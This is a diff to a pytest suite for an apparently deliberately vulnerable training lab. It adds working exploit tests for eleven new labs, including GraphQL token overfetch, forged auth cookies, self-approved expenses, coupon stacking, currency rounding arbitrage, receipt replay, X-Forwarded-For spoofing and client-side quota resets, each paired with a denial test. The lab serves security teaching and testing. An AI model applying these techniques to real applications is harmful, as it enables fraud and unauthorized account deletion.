@@ -17,7 +17,7 @@ import pytest
 
 from vulnlab.app import make_transport, new_state
 from vulnlab.labs import (LABS, SOLVED_KEYS, PIN, ADMIN_TOKEN, ADMIN_API_KEY,
-                          ADMIN_INVITE, STAFF_PIN)
+                          ADMIN_INVITE, STAFF_PIN, GQL_ADMIN_TOKEN)
 
 BASE = "http://vuln.local"
 
@@ -37,7 +37,7 @@ def test_fresh_state_has_nothing_solved():
     _, state = client()
     assert state["solved"] == {k: False for k in SOLVED_KEYS}
     assert set(SOLVED_KEYS) == {lab.solved_key for lab in LABS}
-    assert len(LABS) == 26
+    assert len(LABS) == 37
 
 
 def test_registry_metadata_is_complete():
@@ -454,6 +454,192 @@ def test_referral_single_use_insufficient():
     assert state["solved"]["referral"] is False
 
 
+# --------------------------------------------------------------- enterprise III
+def test_graphql_overfetch_then_delete():
+    c, state = client()
+    body = c.post("/graphql", data={"query": "query { user(id: 1) { name role apiToken } }"}).text
+    tok = json.loads(body)["data"]["user"]["apiToken"]
+    assert tok == GQL_ADMIN_TOKEN
+    c.post("/graphql", data={"query": f'mutation {{ deleteUser(name: "carlos", adminToken: "{tok}") }}'})
+    assert state["solved"]["graphql"] is True
+
+
+def test_graphql_wrong_token_denied():
+    c, state = client()
+    c.post("/graphql", data={"query": 'mutation { deleteUser(name: "carlos", adminToken: "nope") }'})
+    assert state["solved"]["graphql"] is False
+
+
+def test_cookie_forged_admin_identity():
+    c, state = client()
+    forged = base64.urlsafe_b64encode(b"administrator:administrator").rstrip(b"=").decode()
+    c.post("/portal/remove-user", data={"username": "carlos"}, headers={"Cookie": f"auth={forged}"})
+    assert state["solved"]["cookie"] is True
+
+
+def test_cookie_normal_identity_denied():
+    c, state = client()
+    normal = base64.urlsafe_b64encode(b"wiener:user").rstrip(b"=").decode()
+    r = c.post("/portal/remove-user", data={"username": "carlos"}, headers={"Cookie": f"auth={normal}"})
+    assert r.status_code == 403 and state["solved"]["cookie"] is False
+
+
+def test_selfapprove_high_value_expense():
+    c, state = client()
+    login(c)
+    eid = re.search(r"(EXP-\d+)", c.post("/erp/submit", data={"amount": "5000"}).text).group(1)
+    c.post("/erp/approve", data={"expense_id": eid})
+    c.post("/erp/pay", data={"expense_id": eid})
+    assert state["solved"]["selfapprove"] is True
+
+
+def test_selfapprove_small_expense_not_a_win():
+    c, state = client()
+    login(c)
+    eid = re.search(r"(EXP-\d+)", c.post("/erp/submit", data={"amount": "100"}).text).group(1)
+    c.post("/erp/approve", data={"expense_id": eid})
+    c.post("/erp/pay", data={"expense_id": eid})
+    assert state["solved"]["selfapprove"] is False
+
+
+def test_stack_coupon_stacking():
+    c, state = client()
+    login(c)
+    c.post("/stack/apply", data={"code": "SAVE30"})
+    c.post("/stack/apply", data={"code": "EXTRA30"})
+    c.post("/stack/checkout")
+    assert state["solved"]["stack"] is True
+
+
+def test_stack_single_coupon_insufficient():
+    c, state = client()
+    login(c)
+    c.post("/stack/apply", data={"code": "SAVE30"})
+    c.post("/stack/checkout")
+    assert state["solved"]["stack"] is False
+
+
+def test_fx_rounding_arbitrage():
+    c, state = client()
+    login(c)
+
+    def bal(txt):
+        m = re.search(r"USD (\d+) EUR (\d+)", txt)
+        return int(m.group(1)), int(m.group(2))
+
+    usd, eur = 100, 0
+    for _ in range(60):
+        if usd >= 130:
+            break
+        if usd > 0:
+            usd, eur = bal(c.post("/fx/convert", data={"to": "EUR", "amount": str(usd)}).text)
+        if eur > 0:
+            usd, eur = bal(c.post("/fx/convert", data={"to": "USD", "amount": str(eur)}).text)
+    c.post("/fx/buy")
+    assert state["solved"]["fx"] is True
+
+
+def test_fx_no_arbitrage_cannot_afford():
+    c, state = client()
+    login(c)
+    c.post("/fx/buy")
+    assert state["solved"]["fx"] is False
+
+
+def test_iam_self_add_admin_group():
+    c, state = client()
+    login(c)
+    c.post("/iam/group/add", data={"group": "platform-admins"})
+    c.post("/iam/user/delete", data={"username": "carlos"})
+    assert state["solved"]["iam"] is True
+
+
+def test_iam_delete_denied_without_group():
+    c, state = client()
+    login(c)
+    r = c.post("/iam/user/delete", data={"username": "carlos"})
+    assert r.status_code == 403 and state["solved"]["iam"] is False
+
+
+def test_receipt_replay():
+    c, state = client()
+    login(c)
+    tok = re.search(r"receipt: ([A-Za-z0-9._\-]+)", c.post("/pay/deposit").text).group(1)
+    for _ in range(10):
+        c.post("/pay/credit", data={"receipt": tok})
+    c.post("/pay/buy")
+    assert state["solved"]["receipt"] is True
+
+
+def test_receipt_single_credit_insufficient():
+    c, state = client()
+    login(c)
+    tok = re.search(r"receipt: ([A-Za-z0-9._\-]+)", c.post("/pay/deposit").text).group(1)
+    c.post("/pay/credit", data={"receipt": tok})
+    c.post("/pay/buy")
+    assert state["solved"]["receipt"] is False
+
+
+def test_batch_authz_first_op_only():
+    c, state = client()
+    login(c)
+    c.post("/batch/run", data={"ops": "read:me;delete:carlos"})
+    assert state["solved"]["batch"] is True
+
+
+def test_batch_privileged_first_op_blocked():
+    c, state = client()
+    login(c)
+    r = c.post("/batch/run", data={"ops": "delete:carlos"})
+    assert r.status_code == 403 and state["solved"]["batch"] is False
+
+
+def test_license_plan_tamper():
+    c, state = client()
+    login(c)
+    c.post("/license/activate", data={"plan": "enterprise"})
+    c.post("/license/feature")
+    assert state["solved"]["license"] is True
+
+
+def test_license_free_plan_denied():
+    c, state = client()
+    login(c)
+    c.post("/license/activate", data={"plan": "free"})
+    c.post("/license/feature")
+    assert state["solved"]["license"] is False
+
+
+def test_headerip_forwarded_for_bypass():
+    c, state = client()
+    c.post("/adminpanel/delete", data={"username": "carlos"},
+           headers={"X-Forwarded-For": "10.0.0.5"})
+    assert state["solved"]["headerip"] is True
+
+
+def test_headerip_external_ip_denied():
+    c, state = client()
+    r = c.post("/adminpanel/delete", data={"username": "carlos"},
+               headers={"X-Forwarded-For": "8.8.8.8"})
+    assert r.status_code == 403 and state["solved"]["headerip"] is False
+
+
+def test_quota_usage_counter_tamper():
+    c, state = client()
+    login(c)
+    c.post("/usage/generate")                      # exhausts free tier (used=3)
+    c.post("/usage/sync", data={"used": "0"})      # FLAW: client resets the counter
+    c.post("/usage/generate")
+    assert state["solved"]["quota"] is True
+
+
+def test_quota_over_limit_denied():
+    c, state = client()
+    login(c)
+    c.post("/usage/generate")                      # already at limit -> blocked
+    assert state["solved"]["quota"] is False
+
+
 # --------------------------------------------------------------------- coverage
 @pytest.mark.parametrize("key", SOLVED_KEYS)
 def test_every_lab_has_an_exploit_proof(key):
@@ -464,5 +650,8 @@ def test_every_lab_has_an_exploit_proof(key):
         "jwt", "bola", "reset", "refund",
         "bank", "tenant", "scope", "billing", "loyalty", "invoice",
         "twofa", "records", "files", "deploy", "referral",
+        # enterprise III
+        "graphql", "cookie", "selfapprove", "stack", "fx", "iam",
+        "receipt", "batch", "license", "headerip", "quota",
     }
     assert key in proven, f"lab '{key}' has no exploit proof"
